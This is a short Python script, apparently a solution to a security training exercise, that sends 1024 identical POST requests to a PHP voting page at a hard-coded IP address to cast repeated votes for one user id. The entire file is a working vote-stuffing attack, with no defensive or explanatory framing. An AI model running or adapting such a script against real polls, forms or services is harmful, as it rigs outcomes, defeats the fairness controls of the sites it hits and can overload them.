#!/usr/bin/python3
import requests

success_votes = 0
user_id = 3014
number_print = 1024
votation = {'id': user_id, 'holdthedoor': 'Submit'}

for i in range(0, number_print):
    r = requests.post('http://158.69.76.135/level0.php', data=votation)
    if r.status_code == 200:
        success_votes +=1

print("print success: {}".format(success_votes))
